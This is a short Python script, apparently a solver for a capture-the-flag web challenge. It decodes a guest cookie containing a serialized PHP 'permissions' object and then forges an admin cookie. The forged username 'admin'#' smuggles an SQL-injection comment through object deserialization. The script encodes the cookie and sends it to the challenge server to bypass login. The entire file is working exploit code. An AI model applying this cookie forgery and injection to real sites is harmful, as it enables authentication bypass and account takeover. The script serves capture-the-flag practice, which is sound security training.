#!/usr/bin/env python3
# -*- coding:utf-8 -*-


def decode_cookie():
    import base64
    import urllib.parse

    guest_cookie = "TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3QiO30%253D"
    guest_param = base64.b64decode(urllib.parse.unquote(urllib.parse.unquote(guest_cookie)))
    print(guest_param)


def solver():
    import base64
    import urllib.parse
    import requests

    url = "https://shell1.production.cognitivectf.com/problem/15595/index.php?file=admin"

    # rewrite param
    admin_param = b"""O:11:"permissions":2:{s:8:"username";s:7:"admin'#";s:8:"password";s:5:"guest";}"""

    # create admin cookie
    admin_cookie = urllib.parse.quote(urllib.parse.quote(base64.b64encode(admin_param)))
    print(admin_cookie)

    cookies = {'user_info': admin_cookie}
    res = requests.get(url, cookies=cookies)
    print('HTTP StatusCode: ' + str(res.status_code))
    if res.status_code != 500:
        print(res.text)


if __name__ == "__main__":
    solver()